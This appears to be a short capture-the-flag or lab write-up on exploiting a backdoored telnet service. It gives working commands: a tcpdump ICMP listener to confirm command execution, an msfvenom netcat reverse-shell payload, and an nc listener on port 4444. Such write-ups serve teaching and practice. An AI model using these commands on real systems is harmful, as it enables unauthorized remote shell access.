**Example Method Breakdown**

So, from our enumeration stage, we know:

\- There is a poorly hidden telnet service running on this machine

\- The service itself is marked "backdoor"

\- We have possible username of "Skidy" implicated

**<u>-- Check to see if what we're typing is being executed as a system command</u>**

1.  On your local machine:

The following commands starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on.

- *sudo tcpdump ip proto [\\\icmp](file://icmp) -i tun0*

2.  Now, use the command "ping \[IP ADDRESS\] -c 1" through the telnet session to see if we're able to execute system commands

3.  Generating a MSFVENOM Netcat reverse shell

- *msfvenom -p cmd/unix/reverse_netcat lhost=\[local tun0 ip\] lport=4444 R*

- -p = payload
- lhost = our local host IP address (this is your machine's IP address)
- lport = the port to listen on (this is the port on your machine)
- R = export the payload in raw format

4.  Starting the Netcat Listener

- Nc -lvp {port number}

Example: nc -lvp 4444
